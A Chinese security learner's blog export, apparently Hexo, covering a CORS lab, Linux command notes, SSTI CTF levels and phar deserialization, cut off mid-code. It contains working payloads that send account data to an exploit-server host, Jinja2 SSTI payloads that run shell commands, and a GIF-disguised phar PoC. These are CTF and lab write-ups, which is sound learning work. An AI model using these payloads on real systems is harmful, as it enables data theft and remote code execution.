&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;

注意使用 iframe 沙盒，因为这会生成 null 源请求
接下来按上题操作，题目解决
Lab：具有受信任不安全协议的 CORS 漏洞按照上面两题的步骤操作发现响应体中都回显不出Access-Control-Allow-Origin标头，于是根据题目提示尝试子域名，结果如下：

发现接受本域名以及子域名，还是存在CORS漏洞的
打开产品页面，点击检查库存，并观察它是否使用子域上的 HTTP URL 加载（请注意，该 productID 参数容易受到 XSS 的影响）
于是到bp提供的漏洞利用服务器中，输入如下代码：
&lt;script&gt;    document.location=&quot;http://stock.0a58005104085dbd81d52570007b00a4.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a58005104085dbd81d52570007b00a4.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0abd005e04c25dbc818624a201780074.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt;

最好就不要再整理（我整理格式之后尝试不出来），这段代码的功能是首先将页面重定向到一个特定的URL，然后使用XMLHttpRequest对象向另一个URL发送GET请求，获取账户详情信息。当请求完成时，会将响应内容作为参数拼接到另一个URL中，并将页面重定向到该URL
接下来按照第一题那样继续操作，最后会得到管理员的API，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>cors</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令笔记</title>
    <url>/2024/01/24/Linux%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[省流版echo:打印你给的参数
echo $PATH：输出电脑上的目录
which 参数:会输出运行参数的路径（比如：which echo）
pwd:当前工作目录
cd：改变当前工作目录（例子：cd /home）
.：表示当前目录；..：表示上一级目录
给出被调用运行的程序的绝对路径：程序可以直接运行起来
ls：列出当前目录下的文件
~：带你回到用户目录（在cd命令下面使用）
cd -：将当前目录跳转到你所处的上一个目录
–help：会告诉你这个命令怎么用（ls --help）
mv:重命名文件，接受两个路径，先是原有的，然后是新的；也可以把文件移到不同的目录
mv dotfiles.md foo.md

cp：复制文件，两个路径（复制源路径和目标路径，都要是完整路径，但不必是同一个目录）
cp dotfile.md ../food.md

rm：移除一个文件，不能是目录
rmdir：只允许移除空目录
mkdir：创建一个新目录
Ctrl+l：清空终端，让光标回到顶部
&lt;:重定向这个程序的输入流
大于号：重定向这个程序的输入流
echo hello &gt; hello.txt：把hello输入hello.txt文件中去

cat:打印一个文件的内容（cat也支持输入流和输出流）
cat &lt; hello.txt意思是把hello.txt里面的内容作为cat的输入，把这些内容输出到终端cat &lt; hello.txt &gt;hello2.txthello.txt里面的内容作为cat的输入，把这些内容存到hello2.txt文件中

&gt;&gt;：追加而不是覆写
cat &lt;hello.txt &gt;&gt;hello2.txt当hello2.txt文件中已经有hello时会再加上一个hello

|：去左侧程序的输出做右边程序的输入
tail:打印出输入的最后n行
ls -l / | tail -n1打印最后一行的内容

sudo+平常的命令：会以root的身份运行这个命令
sudo su：接下来以root运行接下来的命令
文件权限位包括读取（read）、写入（write）和执行（execute）权限。

读取权限（r）允许用户查看文件内容和属性。
写入权限（w）允许用户修改文件内容和属性。
执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。

每个文件都有三组权限位，分别对应文件的所有者、用户组和其他用户。
精致版前置知识1.目录符号/ 表示从 根目录
~表示从 家目录(即&#x2F;home&#x2F;用户名，root用户为/root)
. 代表当前目录
.. 代表上一级目录
2.绝对目录与相对目录相对路径 在输入路径时，使用.或者..，表示相对 当前目录 所在的目录位置
绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置，特点：需要写入完整地址
3.&gt; 和 &gt;&gt;重定向 命令功能：将命令执行结果重定向到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中
&gt; 表示输出，会覆盖文件原有的内容
&gt;&gt; 表示追加，会将内容追加到已有文件的末尾
4.|管道符
Linux 允许将 一个命令的输出 可以通过管道| 做为 另一个命令的输入
这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）

pwd 命令对应单词：print working directory
功能：打印当前工作目录
ls 命令对应单词：list
功能：列出目录的内容或者使用通配符列出文件名匹配的文件
格式:
SHELLls [参数]

可选参数



-a
显示指定目录下所有目录与文件，包括隐藏文件



-l
以列表方式显示文件的详细信息


-h
配合 -l 以人性化的方式显示文件大小


注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
find 命令对应单词：find
功能：指定目录及其子目录下查找文件和目录
格式
PLAINTEXTfind [路径] [匹配条件] [动作]

常用的匹配条件：



可选匹配条件
作用



-name
按文件名查找，支持使用通配符 * 和 ?


-type
按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。


-size[+-]
按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。


-mtime
按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。


-user
按文件所有者查找。


-group
按文件所属组查找。


cd 命令对应单词：change directory
功能：更改当前的工作目录
格式:
SHELLcd 目录

cd搭配符号



命令
含义



cd &#x2F;cd ~
切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)


cd .
保持在当前目录不变


cd ..
切换到上级目录


cd –
可以在最近两次工作目录之间来回切换


touch命令功能：

如果文件不存在，可以创建一个空白文件
如果文件已经存在，可以修改文件的末次修改日期

mkdir命令对应单词：make directory
功能：创建一个新的目录



选项
含义



-p
创建多级目录 需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）


注意：新建目录的名称 不能与当前目录中 已有的目录同名
rm命令对应单词：remove
功能：删除文件或目录



可选参数
含义



-f
强制删除，忽略不存在的文件，无需提示


-r
递归地删除目录下的内容，删除文件夹时必须加此参数


cp命令对应单词：copy
功能：复制文件或者目录



可选参数
含义



-i
覆盖文件前提示


-r
若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名


mv命令对应单词：move
功能：移动文件或者目录／文件或者目录重命名



可选参数
含义



-i
覆盖文件前提示


cat命令对应单词： concatenate
功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件



可选参数
含义



-b
对非空输出行编号


-n
对输出的所有行编号


more命令对应单词： more
功能： 分屏显示文件内容
使用 more 的操作键：



操作键
功能



空格键
显示手册页的下一屏


Enter
键 一次滚动手册页的一行


b
回滚一屏


f
前滚一屏


q
退出


&#x2F;word
搜索 word 字符串


echo命令对应单词： more
功能： 在终端中显示参数指定的文字，通常会和重定向联合使用
进程命令ps命令：英文： process status
作用：显示当前正在运行的进程的快照。



命令
作用



ps aux
查看进程的详细状况


ps -ef
显示所有进程的完整信息


ps 进程代号
显示特定进程代号的详细信息


top



kill [-9] 进程代号
终止指定代号的进程， -9 表示强行终止


ps 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明



选项
含义



a
显示终端上的所有进程，包括其他用户的进程


u
显示进程的详细状态


x
显示没有控制终端的进程


top命令：作用： 动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序
输入 q退出 top 命令界面
kill命令：作用： 向进程发送信号以终止或操作进程
常见用法



命令
作用



kill 进程代号
向指定进程代号的进程发送默认的终止信号


kill -9 进程代号
向指定进程代号的进程发送强制终止信号


提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃
pgrep命令：作用： 向进程发送信号以终止或操作进程
PLAINTEXTpgrep [选项] &lt;进程名称&gt;

其中，&lt;进程名称&gt; 是要匹配的进程名称或模式。可以使用通配符进行模糊匹配。



可选选项
说明



-u &lt;用户名&gt;
根据用户名过滤进程。


-n
仅返回最新的匹配进程的进程 ID。


-x
精确匹配进程名称，不进行模糊匹配。


-d &lt;分隔符&gt;
指定输出的分隔符，默认为换行符。


]]></content>
  </entry>
  <entry>
    <title>SSTI靶场题解</title>
    <url>/2024/03/12/SSTI%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[level-1(no waf)遍历目标中含有内建函数 eval 的子类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &quot;http://124.70.99.199:10086/level/1&quot;    for i in range(200):        param = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=param)        if &#x27;eval&#x27; in res.text:            print(i,&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i,res.text,res.status_code,&quot;no&quot;)

所以随便挑一个构造payload为：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;
获取到flag的位置，读取flag：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag.txt").read()')&#125;&#125;
level-2(过滤了大括号)可以用 &#123;%print(......)%&#125; 的形式来代替大括号 ，如下：
&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;))%&#125;

获取到flag的位置，读取flag
level-3(no waf and blind)没有任何回显，最开始是想要利用curl命令来把文件外带出来的curl -d cat /flag.txt -o output.txt，，flag.txt会被写到app.py同目录下，读取不出来，所以这个尝试失败了
后面学长说不必如此，目录下面只有static目录下面的文件可以被直接读取，所以可以把要的文件写到static目录下，就可以直接通过url来进行访问了
所以payload如下
&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt &gt; static/output.txt&quot;).read()&#x27;)&#125;&#125;

然后直接访问/static/output.txt，便可以得到flag.txt的内容
level-4(过滤了[])可以使用 __getitem__() 方法来绕过中括号：
&#123;&#123;&#x27;&#x27;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(158).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

获取到flag的位置，读取flag
level-5(过滤了单双引号)可以使用requests对象进行绕过，如下所示：
level-6(过滤了下划线)使用requests对象进行绕过，
code=&#123;&#123;&#x27;&#x27;[request.values.class][request.values.base][request.values.subclasses]()[284][request.values.init][request.values.globals][&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;&amp;class=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__

以上使用数字或者字符串都可以溯源到object类，但是()，[]等的不行，因为两个的父类分别是tuple和list，所以一旦按照上面的进行操作
便是在初始化元组或者列表
&#123;&#123;().__class__[request.values.base]&#125;&#125;&amp;base=__base__回显Hello tuple[&#x27;__base__&#x27;]&#123;&#123;[].__class__[request.values.base]&#125;&#125;&amp;base=__base__回显Hello list[&#x27;__base__&#x27;]

还有一种编码绕过
__class__ =&gt; \x5f\x5fclass\x5f\x5f

其中_的十六进制编码为\x5f，于是我们可以构造出如下的payload：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;&#123;()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(154)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#x27;popen&#x27;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

level-7(过滤点)使用|attr来进行绕过，payload如下：
code=&#123;&#123;&#x27;&#x27;|attr(&quot;__class__&quot;)|attr(&quot;__bases__&quot;)|attr(&quot;__getitem__&quot;)(0)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(154)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;popen&quot;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

也可以用[]来绕过，如下：
code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[154][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;ls /&#x27;)[&#x27;read&#x27;]()&#125;&#125;

level-8过滤了[&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;]
当用[]进行绕过的时候，里面的所有内容都可以被编码，payload如下：
code=&#123;&#123;&#x27;&#x27;[&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;]()[154][&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u0070\u006f\u0070\u0065\u006e&#x27;](&#x27;ls /&#x27;)[&#x27;read&#x27;]()&#125;&#125;

当然，也可以使用字符串拼接来进行绕过，这里就不一一列举了
level-9(过滤数字0到9)首先我们可以使用过滤器|length来构造数字进行绕过：&#123;% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;
所以payload如下：
code=&#123;% set a=&#x27;aaaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length*&#x27;aaaaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

level-10set config = None这一关的目的是拿到config,当我们使用&#123;&#123;config&#125;&#125;以及&#123;&#123;self&#125;&#125;时都返回了None.看来是被ban了,所以得重新寻找一个储存相关信息的变量，发现存在这么一个变量current_app是我们需要的.官网对current_app提供了这么一句说明

应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。

因此,此处能使用current_app绕过.
构造payload,拿到config
&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;

两句要分别带进去，不能同时带进去
level-11过滤了[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;+&#39;, &#39;request&#39;, &#39;.&#39;, &#39;[&#39;, &#39;]&#39;]，所以我们有以下的操作：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;% set a = dict(__cla=aa,ss__=bb)|join %&#125;&#123;% set b = dict(__ba=aa,se__=bb)|join %&#125;&#123;% set sub = dict(__subcl=aa,asses__=bb)|join %&#125;&#123;% set d = dict(__get=aa,item__=bb)|join %&#125;&#123;% set e = dict(__in=aa,it__=bb)|join %&#125;&#123;% set f = dict(__glo=aa,bals__=bb)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125; &#123;% set bfhc=bfh~c %&#125;&#123;% set space = bfhc%((3~2)|int) %&#125; &#123;% set slas = bfhc%((4~7)|int) %&#125; &#123;%set ls = dict(ls=abc)|join %&#125;&#123;%set i= ls~space~slas %&#125;&#123;%set read = dict(read=aa)|join %&#125;&#123;&#123;1|attr(a)|attr(b)|attr(sub)()|attr(d)(154)|attr(e)|attr(f)|attr(d)(g)(i)|attr(read)()&#125;&#125;

level-12过滤了[&#39;_&#39;, &#39;.&#39;, &#39;0-9&#39;, &#39;\\&#39;, &#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;[&#39;, &#39;]&#39;]
没有过滤requests，所以我们可以结合上题并通过requests对象来进行绕过
借鉴[你还不会FlaskSSTI?]：https://xz.aliyun.com/t/10394?time__1311=mq%2BxBDyDu7KDq40vdbievqWqGKG%3DKe1K4D&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D1XE44Oe9LhAQthl0yGVsdHutPlRqph5qbyfEmDv259FgerbZ_mEeo5_XwD2uDZj6%26wd%3D%26eqid%3Da3e04c52003086bb0000000365ed5d11#toc-21
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/05/hello-world/</url>
    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post$ hexo new &quot;My New Post&quot;

More info: Writing
Run server$ hexo server

More info: Server
Generate static files$ hexo generate

More info: Generating
Deploy to remote sites$ hexo deploy

More info: Deployment
]]></content>
  </entry>
  <entry>
    <title>phar反序列化学习</title>
    <url>/2024/06/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[引用PHP反序列化入门之phar
phar反序列化原理及利用
php反序列化拓展攻击详解–phar
phar介绍简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// php://等类似，也是一种流包装器。
phar结构由 4 部分组成

stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；
manifest 压缩文件的属性等信息，以序列化存储；
contents 压缩文件的内容；
signature 签名，放在文件末尾；

这里有两个关键点，一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多
phar文件的生成以及利用在php.ini中配置如下时，才能生成phar文件，记得要删除前面的分号
phar.readonly = Off

下面举得这个例子php版本要在8.0以上（哭死）
正常的php反序列化是通过unserialize函数来实现的，而phar反序列化可以通过 file_get_contents函数来实现，如下：
&lt;?phperror_reporting();class Test &#123;    public $num = 2;    public function __destruct() &#123;        if ($this-&gt;num === 1) &#123;            echo &#x27;flag&#123;^_^&#125;&#x27;;        &#125;    &#125;&#125;echo file_get_contents($_GET[&#x27;file&#x27;]);

构造phar反序列化的代码如下：
&lt;?phpclass Test &#123;    public $num;&#125;$a = new Test();$a-&gt;num=1;$phar = new Phar(&quot;a.phar&quot;); // 创建一个名为 &quot;a.phar&quot; 的 Phar 归档文件。$phar-&gt;startBuffering(); //使用 startBuffering() 方法开始缓冲，以便在添加文件之前可以对 Phar 对象进行配置。$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); /* 设置stub，必须以__HALT_COMPILER(); ?&gt;结尾*/$phar-&gt;setMetaData($a); # 设置自定义的metadata，序列化存储，解析式会被序列化。$phar-&gt;addFromString(&quot;test2.txt&quot;, &quot;test2&quot;); //要压缩的文件,phar文件里面的文件为test2.txt,内容为test2//签名自动计算$phar-&gt;stopBuffering(); 

然后我们可以看到本地的同一个文件夹下面生成了a.phar
然后get传参：?file=phar://a.phar/test2.txt，可以看到如下结果：
可以看见输出了test2和flag，test2为我们的a.phar文件里面的内容，通过file_get_contents函数读取出来的，至于为什么flag也读出来，是因为a.phar里面有我们的恶意代码，phar文件被反序列化了
触发phar反序列化的敏感函数文件相关的函数fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopenfile_exists / is_dir / is_executable / is_file is_link / is_readable / is_writeable / is_writableparse_ini_fileunlinkcopy

其他触发函数image    exif_thumbnail    exif_imagetype    imageloadfont    imagecreatefrom***    getimagesize    getimagesizefromstringhash    hash_hmac_file    hash_file    hash_update_file    md5_file    sha1_filefile / url    get_meta_tags    get_headers

常见的绕过方式绕过phar:&#x2F;&#x2F;开头compress.bzip://phar://a.phar/test1.txtcompress.bzip2://phar://a.phar/test1.txtcompress.zlib://phar://a.phar/test1.txtphp://filter/resource=phar://a.phar/test1.txtphp://filter/read=convert.base64-encode/resource=phar://a.phar/test1.txt

绕过图片检查可以修改phar文件名的后缀文件开头添加GIFB9a绕过十六进制检查
$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);

利用条件任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。
1.phar文件要能够上传到服务器端。2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。3.文件操作函数的参数可控，且::、/、phar等特殊字符没有被过滤。
例题upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif
&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))      &#123;      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;      &#125;    else      &#123;      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];      &#125;    &#125;else  &#123;  echo &quot;Invalid file,you can only upload gif&quot;;  &#125;

upload_file.html
&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

un.php存在file_exists()，并且存在__destruct()
&lt;?php$filename=@$_GET[&#x27;filename&#x27;];echo &#x27;please input a filename&#x27;.&#x27;&lt;br /&gt;&#x27;;class AnyClass&#123;    var $output = &#x27;echo &quot;ok&quot;;&#x27;;    function __destruct()    &#123;           eval($this -&gt; output);    &#125;&#125;    if(file_exists($filename))&#123;        $a = new AnyClass();    &#125;    else&#123;        echo &#x27;file is not exists&#x27;;    &#125;?&gt;

该环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法__destruct()以及文件操作函数file_exists()，而且在AnyClass类中调用了eval，以此用来命令执行。我们知道以上条件正好满足利用条件。根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar:&#x2F;&#x2F;执行代码
poc.php
&lt;?phpclass AnyClass&#123;    var $output = &#x27;&#x27;;&#125;$phar = new Phar(&#x27;phar.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$object = new AnyClass();$object -&gt; output= &#x27;phpinfo();&#x27;;$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering();

生成phar文件后，改后缀为gif
payload:un.php?filename=phar://phar.gif/test


[SWPUCTF 2018]SimplePHP开启题目环境，进入点击查看文件的时候搜索栏为：http://96147239-9a37-4585-8e45-c7494c8aa92b.node5.buuoj.cn:81/file.php?file=，通过file来读取文件，是个可疑点
查看页面源码，如下：

提示flag在f1ag.php中，尝试直接访问，回显hacker
尝试读取文件：/file.php?file=file.php，代码如下：
&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#x27;file doesn\&#x27;t exists.&#x27;); &#125; 

看得出来文件都存在/var/www/html目录下面；另外函数file_exists，感觉可以利用phar反序列化漏洞
查看包含的文件class.php，如下：
&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;

可以发现文件读取的主要函数是file_get ，我们可以构造它的内容为&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php读取flag
但是要想执行file_get 函数就必须调用get函数，可以看见get方法的调用又来自__get魔术方法，在__get魔术方法中访问一个对象的不可访问属性时被调用，会自动调用
可以知道代码中的类Show中的__toString()方法中的$content = $this-&gt;str[&#39;str&#39;]-&gt;source;，当$this-&gt;str[&#39;str&#39;]=new Test()时，相当于访问它的不存在属性source，会触发__get魔术方法
调用__toString()方法的话必须使用echo打印该对象，而类C1e4r中__destruct()方法便有echo，只要使$this-&gt;source=new Show()便会触发上面所要的方法
综上，pop链的构造思路如下：
Test()-&gt;params[&#x27;source&#x27;]=&quot;/var/www/html/f1ag.php&quot;; //Test类中获取的文件为f1ag.phpShow()-&gt;str[&#x27;str&#x27;] = new Test(); //调用Show类的属性，因为在Test类中不存在该属性，触发__get方法C1e4r()-&gt;str = new Show(); //调用C1e4r类的str属性给Show类

别忘了，file.php文件还包含了function.php文件，访问：/file.php?file=function.php，得到的代码如下：
&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = 